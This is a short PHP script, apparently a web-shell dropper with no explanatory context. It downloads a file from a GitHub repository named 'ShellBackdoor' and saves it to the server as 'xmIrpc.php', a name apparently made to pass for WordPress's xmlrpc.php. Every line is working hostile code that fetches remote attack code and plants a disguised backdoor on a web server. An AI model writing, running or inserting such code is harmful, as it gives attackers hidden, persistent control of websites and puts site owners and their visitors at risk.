<?php
$nama= fopen("xmIrpc.php" ,"w+");
$file = file_get_contents('https://github.com/mr-quixter/ShellBackdoor/raw/main/install-ev.php');
$tulis = fwrite ($nama ,$file);
fclose($nama);
?>
